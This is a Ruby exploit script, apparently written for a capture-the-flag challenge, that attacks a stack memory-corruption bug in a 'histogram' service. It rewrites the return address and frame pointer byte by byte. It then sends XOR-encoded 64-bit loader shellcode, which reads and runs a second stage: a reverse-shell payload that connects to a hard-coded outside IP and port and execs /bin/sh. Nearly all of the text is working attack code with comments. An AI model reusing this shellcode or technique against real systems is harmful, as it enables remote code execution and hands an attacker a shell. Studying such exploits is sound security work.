# The base address of the array that overwrites code
# (Note: this can change based on the length that we sent! The rest doesn't appear to)
BASE_VULN_ARRAY = 0x7fffffffdf80-0x90

# The real target and my local target have different desired FP values
IS_REAL_TARGET = 1

# We want to edit the return address
RETURN_ADDR         = 0x7fffffffdf88  # Where the value we want to edit is
RETURN_OFFSET       = RETURN_ADDR - BASE_VULN_ARRAY
REAL_RETURN_ADDR    = 0x40160e
DESIRED_RETURN_ADDR = 0x4015AA

# And also edit the frame pointer
FP_ADDR         = 0x7fffffffdf80
FP_OFFSET       = FP_ADDR - BASE_VULN_ARRAY
REAL_FP         = 0x00007fffffffdfb0
DESIRED_FP      = 0x00007fffffffdfe8 + (7 * 8 * IS_REAL_TARGET)

# This global tracks which characters we use in our shellcode, to avoid
# influence the histogram values for the important offsets
@@used_chars = []

# Keep track of how many bytes were printed, so we can print padding after
# (and avoid changing the size of the stack)
#
# I added this because I noticed addresses on the stack shifting relative
# to each other, a bit, though that may have been sleep-deprived daftness
@@n = 0
def my_print(str)
  print(str)
  @@n += str.length
end

# Code is 'encrypted' with a simple xor operation
def encode_shellcode(code)
  buf = ""

  0.upto(code.length-1) do |i|
    c = code[i].ord ^ 0xFF;

    # If encoded shellcode contains a newline, it won't work, so catch it early
    if(c == 0x0a)
      $stderr.puts("Shellcode has a newline! :(")
      exit
    end

    # Increment the histogram for this character
    @@used_chars[c] = @@used_chars[c].nil? ? 1 : @@used_chars[c] + 1

    # Append it to the buffer
    buf += c.chr
  end

  return buf
end

# This will edit any memory address up to 32 bytes away on the stack. I
# wrote it because I got sick of doing this manually.
#
# Basically, it looks at two variables - the 'from' is the original, known
# value, and 'to' is value we want it to be. It modifies each of the
# variables one byte at a time, by incrementing the byte.
#
# Each byte increment is one character in the output, so the more different
# the values are, the bigger the output gets (eventually getting too big)
def edit_memory(from, to, location)
  # Handle each of the 7 bytes, though in practice I think we only needed
  # the first two
  0.upto(7) do |i|
    # Get the before and after values for the current byte
    from_i = (from >> (8 * i)) & 0xFF
    to_i   = (to   >> (8 * i)) & 0xFF

    # As long as the bytes are different, add the current 'increment' character
    while(from_i != to_i) do
      # If we already have the location from the shellcode or something, don't
      # repeat it
      if(!@@used_chars[location+i].nil? && @@used_chars[location+i] > 0)
        $stderr.puts("Saved a character!")
        @@used_chars[location+i] -= 1
      else
        my_print((location+i).chr)
      end

      # Increment as a byte
      from_i = (from_i + 1) & 0xFF
    end
  end
end

# Choose 'histogram'
puts("1")

# The first part gets eaten, I'm not sure why
my_print(encode_shellcode("\x90" * 20))

# Encode the custom-written loader code that basically reads from the
# socket into some allocated memory, then runs it.
#
# Trivia: This is my first 64-bit shellcode! :)
#
# This had to be carefully constructed because it would influence the
# eventual histogram, which would modify the stack and therefore break
# everything.
my_print(encode_shellcode(

  "\xb8\x09\x00\x00\x00"     + # mov eax, 0x00000006 (mmap)
  "\xbf\x00\x00\x00\x41"     + # mov edi, 0x41000000 (addr)
  "\xbe\x00\x10\x00\x00"     + # mov esi, 0x1000 (size)
  "\xba\x07\x00\x00\x00"     + # mov rdx, 7 (prot)
  "\x41\xba\x32\x00\x00\x00" + # mov r10, 0x32 (flags)
  "\x41\xb8\x00\x00\x00\x00" + # mov r8, 0
  "\x41\xb9\x00\x00\x00\x00" + # mov r9, 0
  "\x0f\x05"                 + # syscall - mmap

  "\xbf\x98\xf8\xd0\xb0"     + # mov edi, ptr to socket ^ 0xb0b0b0b0
  "\x81\xf7\xb0\xb0\xb0\xb0" + # xor edi, 0xb0b0b0b0
  "\x48\x8b\x3f"             + # mov edi, [edi]

  "\xb8\x00\x00\x00\x00"     + # mov rax, 0
  "\xbe\x00\x00\x00\x41"     + # mov esi, 0x41000000
  "\xba\x00\x20\x00\x00"     + # mov edx, 0x2000
  "\x0f\x05"                 + # syscall - read
  "\x56\xc3"                 + # push esi / ret
  "\xc3"                     + # ret

  "\xcd\x03" # int 3
))

# The 'decryption' function requires some NOPs (I think 6) followed by a return
# to identify the end of an encrypted function
my_print(encode_shellcode(("\x90" * 10) + "\xc3"))

## Increment the return address
edit_memory(REAL_RETURN_ADDR, DESIRED_RETURN_ADDR, RETURN_OFFSET)
edit_memory(REAL_FP, DESIRED_FP, FP_OFFSET)

# Pad up to exactly 0x300 bytes
while(@@n < 0x300)
  my_print(encode_shellcode("\x90"))
  @@n += 1
end

# Add the final newline, which triggers the overwrites and stuff
puts()

# This is standard shellcode I found online and modified a tiny bit
#
# It's what's read by the 'loader'.
SCPORT = "\x41\x41" # 16705 */
SCIPADDR = "\xce\xdc\xc4\x3b" # 206.220.196.59 */
puts("" +
  "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a" +
  "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0" +
  "\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24" +
  "\x02"+SCPORT+"\xc7\x44\x24\x04"+SCIPADDR+"\x48\x89\xe6\x6a\x10" +
  "\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48" +
  "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a" +
  "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54" +
  "\x5f\x6a\x3b\x58\x0f\x05\0\0\0\0")

